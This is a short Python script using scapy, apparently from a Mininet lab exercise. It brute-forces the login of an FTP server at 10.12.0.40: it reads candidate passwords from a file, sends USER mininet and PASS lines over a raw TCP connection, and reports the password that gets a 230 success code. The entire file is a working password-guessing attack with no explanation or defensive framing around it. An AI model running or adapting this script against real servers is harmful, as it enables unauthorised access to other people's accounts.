import scapy.all as scapy
from scapy.layers.inet import IP, TCP



def get_passwords():
    with open("passwords.txt", encoding="utf8") as file:
	    return file.readlines()

def command_result(connexion, command, expected):
    connexion.send(command)
    return expected in str(connexion.recv())

def attack():
    for password in get_passwords():
        connexion = scapy.TCP_client.tcplink(scapy.Raw, "10.12.0.40", 21)
        code = connexion.recv()
        print(str(code))

        if "220" in str(code) or "530" in str(code):
            if command_result(connexion, "USER mininet\r\n", "331"):
                if command_result(connexion, "PASS {}\r\n".format(password).encode(), "230"):
                    print("success with password: ", password)
                    connexion.close()
                    return
        else:
            print("cannot connect to FTP server")
            connexion.close()
            return
    connexion.close()
    print("no password found")

if __name__ == '__main__':
    attack()